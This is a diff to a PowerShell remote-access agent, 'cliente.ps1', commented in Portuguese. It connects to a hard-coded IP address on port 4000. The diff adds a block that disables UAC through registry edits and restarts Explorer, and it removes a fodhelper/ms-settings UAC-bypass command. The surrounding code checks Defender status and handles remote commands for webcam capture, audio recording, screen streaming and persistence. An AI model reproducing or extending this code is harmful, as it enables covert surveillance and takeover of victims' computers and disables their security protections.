@@ -1,4 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
+# Agent Completo: Auto-Elevação Invisível + UAC Desativado + Persistencia + Clipboard + Audio
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -24,13 +25,6 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
-    # Desativar UAC permanentemente
-    try {
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
-    } catch {}
-
     $defenderOff = $false
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
@@ -137,6 +131,16 @@ if (-not $isAdmin) {
     } catch {}
     exit
 }
+
+# Se chegou aqui, o agente JÁ ESTÁ RODANDO COMO ADMINISTRADOR.
+# Vamos desativar a tela preta do UAC e forçar a atualização sem reiniciar o PC.
+try {
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
+    # Reiniciar o Explorer faz o Windows recarregar as regras do UAC na hora, sem reiniciar o PC
+    Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
+} catch {}
 
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0)) { exit }
@@ -645,25 +649,6 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 if (cmd == "audio_start") { StartAudio(); lock(writeLock) { myWriter.WriteLine("AUDIO_ON"); } return; }
                 if (cmd == "audio_stop") { isAudioRunning = false; lock(writeLock) { myWriter.WriteLine("AUDIO_OFF"); } return; }
-                
-                // COMANDO NOVO DE BYPASS PARA ABRIR PROGRAMAS DIRETO COMO ADMIN
-                if (cmd.StartsWith("run_admin ")) {
-                    string target = cmd.Substring(10).Trim();
-                    try {
-                        string k = @"Software\Classes\ms-settings\shell\open\command";
-                        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(k)) {
-                            key.SetValue("", target, RegistryValueKind.String);
-                            key.SetValue("DelegateExecute", "", RegistryValueKind.String);
-                        }
-                        Process.Start("fodhelper.exe");
-                        Thread.Sleep(1500);
-                        try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings"); } catch {}
-                        lock (writeLock) { myWriter.WriteLine("ELEVATE_OK: " + target); }
-                    } catch (Exception ex) {
-                        lock (writeLock) { myWriter.WriteLine("ELEVATE_ERR: " + ex.Message); }
-                    }
-                    return;
-                }
 
                 if (cmd == "webcam") {
                     string b64 = CaptureWebcam();
